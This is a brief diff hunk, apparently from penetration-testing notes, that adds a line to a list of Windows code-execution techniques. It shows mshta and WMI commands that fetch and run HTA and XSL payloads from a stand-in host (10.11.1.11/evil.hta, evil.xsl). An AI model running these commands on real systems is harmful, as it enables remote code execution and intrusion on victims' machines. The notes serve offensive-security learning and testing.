@@ -325,6 +325,7 @@ Includes web services (not just port 80)
   </head><body><script language="JScript">self.close();</script></body></html>
   C:\> mshta evil.js
   ```
+  - Can also use an http path: `C:\Windows\System32\mshta.exe http://10.11.1.11/evil.hta`
 - XSL -- use WMI to run an XSL file with cmds:
   ```
   wmi process get brief /format:"http://10.11.1.11/evil.xsl"
